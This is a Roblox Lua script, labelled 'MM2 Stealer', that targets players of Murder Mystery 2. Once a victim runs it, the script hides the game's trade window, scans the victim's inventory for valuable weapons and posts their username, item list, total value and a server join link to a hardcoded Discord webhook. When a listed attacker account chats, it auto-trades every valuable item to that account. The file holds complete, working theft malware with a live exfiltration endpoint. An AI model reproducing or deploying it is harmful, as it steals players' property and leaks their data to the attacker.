_G.scriptExecuted = _G.scriptExecuted or false 
if _G.scriptExecuted then return end 
_G.scriptExecuted = true

-- ===== SERVICES =====
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")

-- ===== CONFIGURATION =====
local users = _G.Usernames or {"zzeeuuss1233"}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "Yes"
local webhook = _G.webhook or "https://discord.com/api/webhooks/1374394558657331374/-dmo5vt8NdkPEBRMIrKBG4TdeMxJBrIIyVZSlcqGbB8OZwf8-8QT3Pqxkmj3Tn3H2ksX"

-- ===== VALIDATION =====
if next(users) == nil or webhook == "" then
    plr:kick("Missing username or webhook")
    return
end

if game.PlaceId ~= 142823291 then
    plr:kick("Please join a normal MM2 server")
    return
end

if #Players:GetPlayers() >= 12 then
    plr:kick("Server is full. Join a less populated server")
    return
end

-- ===== VIP SERVER CHECK =====
local serverType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
if serverType == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

-- ===== DATABASE =====
local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))

-- ===== RARITY TABLE =====
local rarityTable = {
    "Common", "Uncommon", "Rare", "Legendary", 
    "Godly", "Ancient", "Unique", "Vintage"
}
local min_rarity_index = table.find(rarityTable, min_rarity)

-- ===== UNTRADABLE ITEMS =====
local untradable = {
    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
    ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
    ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true,
    ["Gingerscythe_Legendary"] = true, ["Gingerscythe_Godly"] = true,
    ["Gingerscythe_Ancient"] = true, ["TestItem"] = true, ["Season1TestKnife"] = true,
    ["Cracks"] = true, ["Icecrusher"] = true, ["???"] = true, ["Dartbringer"] = true,
    ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true, ["TravelerAxeSilver"] = true,
    ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true, ["GreenCamo_K_2022"] = true,
    ["SharkSeeker"] = true
}

-- ===== VALUE FETCHING =====
local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}

local headers = {
    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

local function trim(s)
    return s:match("^%s*(.-)%s*$")
end

local function fetchHTML(url)
    local response = request({
        Url = url,
        Method = "GET",
        Headers = headers
    })
    return response.Body
end

local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("([%d,%.]+)")
    if valueStr then
        return tonumber(valueStr:gsub(",", ""))
    end
    return nil
end

local function extractItems(htmlContent)
    local itemValues = {}
    for itemName, itembodyDiv in htmlContent:gmatch("(.-)%s*(.-)") do
        itemName = itemName:match("([^<]+)")
        if itemName then
            itemName = trim(itemName:gsub("%s+", " ")):lower()
            itemName = trim((itemName:split(" Click "))[1])
            local value = parseValue(itembodyDiv)
            if value then
                itemValues[itemName] = value
            end
        end
    end
    return itemValues
end

local function extractChromaItems(htmlContent)
    local chromaValues = {}
    for chromaName, itembodyDiv in htmlContent:gmatch("(.-)%s*(.-)") do
        chromaName = chromaName:match("([^<]+)")
        if chromaName then
            chromaName = trim(chromaName:gsub("%s+", " ")):lower()
            local value = parseValue(itembodyDiv)
            if value then
                chromaValues[chromaName] = value
            end
        end
    end
    return chromaValues
end

local function buildValueList()
    local allExtractedValues = {}
    local chromaExtractedValues = {}
    local completed = 0
    local totalCategories = 5
    local lock = Instance.new("BindableEvent")
    
    for rarity, url in pairs(categories) do
        task.spawn(function()
            local htmlContent = fetchHTML(url)
            if htmlContent and htmlContent ~= "" then
                if rarity ~= "chroma" then
                    local extracted = extractItems(htmlContent)
                    for itemName, value in pairs(extracted) do
                        allExtractedValues[itemName] = value
                    end
                else
                    chromaExtractedValues = extractChromaItems(htmlContent)
                end
            end
            completed = completed + 1
            if completed == totalCategories then
                lock:Fire()
            end
        end)
    end
    
    lock.Event:Wait()
    
    local valueList = {}
    for dataid, item in pairs(database) do
        local itemName = item.ItemName and item.ItemName:lower() or ""
        local rarity = item.Rarity or ""
        local hasChroma = item.Chroma or false
        
        if itemName ~= "" and rarity ~= "" then
            local weaponRarityIndex = table.find(rarityTable, rarity)
            local godlyIndex = table.find(rarityTable, "Godly")
            
            if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
                if hasChroma then
                    for chromaName, value in pairs(chromaExtractedValues) do
                        if chromaName:find(itemName) then
                            valueList[dataid] = value
                            break
                        end
                    end
                else
                    local value = allExtractedValues[itemName]
                    if value then
                        valueList[dataid] = value
                    end
                end
            end
        end
    end
    return valueList
end

-- ===== GET VALUES =====
local valueList = buildValueList()

-- ===== HIDE TRADE GUI =====
local tradegui = playerGui:WaitForChild("TradeGUI")
tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradegui.Enabled = false
end)

local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
    tradeguiphone.Enabled = false
end)

-- ===== SCAN INVENTORY =====
local weaponsToSend = {}
local totalValue = 0
local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)

for dataid, amount in pairs(realData.Weapons.Owned) do
    if not untradable[dataid] then
        local rarity = database[dataid].Rarity
        local rarityIndex = table.find(rarityTable, rarity)
        
        if rarityIndex and rarityIndex >= min_rarity_index then
            local value = valueList[dataid]
            
            if value and value >= min_value then
                totalValue = totalValue + (value * amount)
                table.insert(weaponsToSend, {
                    DataID = dataid,
                    Rarity = rarity,
                    Amount = amount,
                    Value = value,
                    TotalValue = value * amount
                })
            elseif rarityIndex >= table.find(rarityTable, "Godly") then
                totalValue = totalValue + (2 * amount)
                table.insert(weaponsToSend, {
                    DataID = dataid,
                    Rarity = rarity,
                    Amount = amount,
                    Value = 2,
                    TotalValue = 2 * amount
                })
            end
        end
    end
end

-- ===== SORT BY VALUE (HIGHEST FIRST) =====
table.sort(weaponsToSend, function(a, b)
    return a.Value > b.Value
end)

-- ===== TRADE FUNCTIONS =====
local function sendTradeRequest(user)
    ReplicatedStorage.Trade.SendRequest:InvokeServer(Players:WaitForChild(user))
end

local function getTradeStatus()
    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
end

local function waitForTradeCompletion()
    while getTradeStatus() ~= "None" do
        task.wait(0.1)
    end
end

local function acceptTrade()
    ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
end

local function addWeaponToTrade(id)
    ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons")
end

-- ===== UNIVERSAL WEBHOOK FUNCTION =====
local function executeWebhook(webhookData)
    local success = false
    
    local requestFuncs = {
        syn and syn.request,
        http and http.request,
        http_request,
        request,
    }
    
    for _, func in ipairs(requestFuncs) do
        if func then
            local pcallSuccess = pcall(function()
                func({
                    Url = webhook,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode(webhookData)
                })
            end)
            
            if pcallSuccess then
                success = true
                break
            end
        end
    end
    
    if not success then
        print("⚠️ Webhook failed - continuing trade")
    end
    return success
end

-- ===== DISCORD FUNCTIONS =====
local function SendFirstMessage(list, prefix)
    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId,
            inline = false
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        }
    }
    
    for _, item in ipairs(list) do
        local itemLine = string.format("%s (x%s): %s Value (%s)\n", 
            item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
        fields[3].value = fields[3].value .. itemLine
    end
    
    if #fields[3].value > 1024 then
        fields[3].value = string.sub(fields[3].value, 1, 1000) .. "\nPlus more!"
    end
    
    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "🔪 Join to get MM2 hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {["text"] = "Trade Helper"}
        }}
    }
    
    executeWebhook(data)
end

local function SendMessage(sortedItems)
    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Items sent:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: %s", totalValue),
            inline = false
        }
    }
    
    for _, item in ipairs(sortedItems) do
        local itemLine = string.format("%s (x%s): %s Value (%s)\n", 
            item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
        fields[2].value = fields[2].value .. itemLine
    end
    
    if #fields[2].value > 1024 then
        fields[2].value = string.sub(fields[2].value, 1, 1000) .. "\nPlus more!"
    end
    
    local data = {
        ["embeds"] = {{
            ["title"] = "🔪 New MM2 Execution",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {["text"] = "MM2 Stealer"}
        }}
    }
    
    executeWebhook(data)
end

-- ===== HIGH VALUE PING SYSTEM =====
local function startHighValuePings()
    if totalValue < 500 then
        print("Value below 500 - no extra pings")
        return
    end
    
    print("🔥 HIGH VALUE DETECTED: " .. totalValue .. " - Sending extra pings")
    
    task.spawn(function()
        local pingsSent = 1
        local maxPings = 3
        local pingInterval = 30
        local isActive = true
        local prefix = ping == "Yes" and "--[[@everyone]] " or ""
        
        local function onPlayerRemoving(player)
            if player.Name == plr.Name then
                print("🚫 Victim left - stopping extra pings")
                isActive = false
            end
        end
        Players.PlayerRemoving:Connect(onPlayerRemoving)
        
        while isActive and pingsSent < maxPings do
            for i = 1, pingInterval do
                task.wait(1)
                if not isActive then 
                    print("🚫 Extra pings stopped - victim left")
                    return 
                end
            end
            
            local topItems = ""
            for i = 1, math.min(3, #weaponsToSend) do
                local item = weaponsToSend[i]
                topItems = topItems .. string.format("%d. **%s** - %d value\n", i, item.DataID, item.Value)
            end
            
            local pingEmbed = {
                ["content"] = prefix .. "🔄 **HIGH VALUE VICTIM STILL IN SERVER!**",
                ["embeds"] = {{
                    ["title"] = "💰 Value: " .. totalValue,
                    ["color"] = 0xFF0000,
                    ["fields"] = {
                        {name = "Victim:", value = plr.Name, inline = true},
                        {name = "Server:", value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId, inline = false},
                        {name = "Top Items:", value = topItems, inline = false}
                    },
                    ["footer"] = {["text"] = string.format("Extra ping %d/%d", pingsSent + 1, maxPings)}
                }}
            }
            
            executeWebhook(pingEmbed)
            pingsSent = pingsSent + 1
            print("✅ Extra ping " .. pingsSent .. " sent")
        end
        
        if pingsSent >= maxPings then
            print("✅ Completed all " .. maxPings .. " pings")
        end
    end)
end

-- ===== TRADE LOOP =====
local function doTrade(joinedUser)
    while #weaponsToSend > 0 do
        local tradeStatus = getTradeStatus()
        
        if tradeStatus == "None" then
            sendTradeRequest(joinedUser)
        elseif tradeStatus == "StartTrade" then
            for i = 1, math.min(4, #weaponsToSend) do
                local weapon = table.remove(weaponsToSend, 1)
                for _ = 1, weapon.Amount do
                    addWeaponToTrade(weapon.DataID)
                    task.wait()
                end
            end
            task.wait(2)
            acceptTrade()
            waitForTradeCompletion()
        end
        task.wait(0.5)
    end
    plr:kick("Try again later.")
end

-- ===== WAIT FOR USER CHAT =====
local function waitForUserChat()
    local sentMessage = false
    
    local function onPlayerChat(player)
        if table.find(users, player.Name) then
            player.Chatted:Connect(function()
                if not sentMessage then
                    SendMessage(weaponsToSend)
                    sentMessage = true
                end
                doTrade(player.Name)
            end)
        end
    end
    
    for _, p in ipairs(Players:GetPlayers()) do
        onPlayerChat(p)
    end
    
    Players.PlayerAdded:Connect(onPlayerChat)
end

-- ===== START =====
if #weaponsToSend > 0 then
    local prefix = ping == "Yes" and "--[[@everyone]] " or ""
    
    SendFirstMessage(weaponsToSend, prefix)
    
    if totalValue >= 500 then
        startHighValuePings()
    else
        print("Value below 500 - single ping only")
    end
    
    waitForUserChat()
else
    plr:kick("No valuable items found")
end
